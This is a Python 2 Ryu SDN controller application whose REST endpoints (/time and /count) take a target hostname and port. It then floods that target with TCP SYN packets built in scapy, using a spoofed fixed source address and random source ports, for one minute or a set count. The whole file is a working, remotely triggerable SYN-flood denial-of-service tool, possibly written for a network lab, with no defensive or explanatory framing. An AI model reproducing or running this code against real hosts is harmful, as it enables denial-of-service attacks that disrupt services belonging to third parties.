import json
import logging

from ryu.app import simple_switch_13
from webob import Response
from ryu.controller import ofp_event
from ryu.controller.handler import CONFIG_DISPATCHER
from ryu.controller.handler import set_ev_cls
from ryu.app.wsgi import ControllerBase, WSGIApplication, route
from ryu.lib import dpid as dpid_lib
import json
import socket
import time
import sys
from scapy.all import *
import random


simple_switch_instance_name = 'simple_switch_api_app'
url_time = '/time'
url_count = '/count'
conf.iface = 'eth0'


class sendSYN():

    def __init__(self, target, port):
        self.target = target
        self.port = port

    def run(self):
        i = IP()
        i.src = '192.168.11.23'
        i.dst = self.target
        t = TCP()
        t.sport = random.randint(1, 65535)
        t.dport = self.port
        t.flags = 'S'
        send(i/t, verbose=0)


class PacketSender(simple_switch_13.SimpleSwitch13):

    _CONTEXTS = {'wsgi': WSGIApplication}

    def __init__(self, *args, **kwargs):
        super(PacketSender, self).__init__(*args, **kwargs)
        self.switches = {}
        wsgi = kwargs['wsgi']
        wsgi.register(PacketSenderController,
                      {simple_switch_instance_name: self})

    @set_ev_cls(ofp_event.EventOFPSwitchFeatures, CONFIG_DISPATCHER)
    def switch_features_handler(self, ev):
        super(PacketSender, self).switch_features_handler(ev)
        datapath = ev.msg.datapath
        self.switches[datapath.id] = datapath
        self.mac_to_port.setdefault(datapath.id, {})

    def store_target_Info(self, info):
        with open('../ipInfo/target.json', 'w') as f:
            f.write(json.dumps(info))
        f.close()
        return "get target info."

    def send_time(self):
        total = 0
        with open('../ipInfo/target.json', 'r') as f:
            json_data = json.load(f)
            Hostname = json_data['target']
            ip = socket.gethostbyname(Hostname)
            port = json_data['port']
            runtime = time.time() + 60

        while 1:
            if time.time() < runtime:
                sendSYN(ip, port).run()
                total += 1
                print total
            else:
                print "Send one minute."
                break
        return "It't done."

    def send_count(self):
        total = 0
        with open('../ipInfo/target.json', 'r') as f:
            json_data = json.load(f)
            Hostname = json_data['target']
            ip = socket.gethostbyname(Hostname)
            port = json_data['port']
            count = json_data['count']
            print "Hostname:" + Hostname
            print "IP:" + ip

        while 1:
            if total < count:
                sendSYN(ip, port).run()
                total += 1
                print total
            else:
                print "Send one hundred."
                break
        return "It't done."


class PacketSenderController(ControllerBase):

    def __init__(self, req, link, data, **config):
        super(PacketSenderController, self).__init__(req, link, data, **config)
        self.simpl_switch_spp = data[simple_switch_instance_name]

    @route('simpleswitch', url_time, methods=['POST'])
    def send_packet_bytime(self, req, **kwargs):

        simple_switch = self.simpl_switch_spp
        Info = json.loads(req.body)

        try:
            success = simple_switch.store_target_Info(Info)
            print success
            check = simple_switch.send_time()
            print check
        except Exception as e:
            return Response(status=500)

    @route('simpleswitch', url_count, methods=['POST'])
    def send_packet_bycount(self, req, **kwargs):

        simple_switch = self.simpl_switch_spp
        Info = json.loads(req.body)

        try:
            success = simple_switch.store_target_Info(Info)
            print success
            check = simple_switch.send_count()
            print check
        except Exception as e:
            return Response(status=500)
